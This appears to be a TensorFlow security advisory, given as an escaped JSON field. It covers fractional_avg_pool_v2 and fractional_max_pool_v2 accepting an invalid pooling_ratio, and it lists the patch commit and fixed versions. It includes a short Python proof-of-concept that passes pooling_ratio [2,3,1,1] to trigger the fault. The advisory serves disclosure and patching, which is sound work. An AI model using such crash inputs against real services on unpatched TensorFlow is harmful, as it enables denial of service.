    "Description": "### Impact\n`nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.\n\n```python\nimport tensorflow as tf\nimport os\nimport numpy as np\nfrom tensorflow.python.ops import nn_ops\ntry:\n  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)\n  arg_0 = tf.identity(arg_0_tensor)\n  arg_1_0 = 2\n  arg_1_1 = 3\n  arg_1_2 = 1\n  arg_1_3 = 1\n  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]\n  arg_2 = True\n  arg_3 = True\n  seed = 341261001\n  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)\nexcept Exception as e:\n  print(\"Error:\"+str(e))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ee50d1e00f81f62a4517453f721c634bbb478307](https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was reported by [dmc1778](https://github.com/dmc1778), of [nimashiri2012@gmail.com](mailto:nimashiri2012@gmail.com).\n",
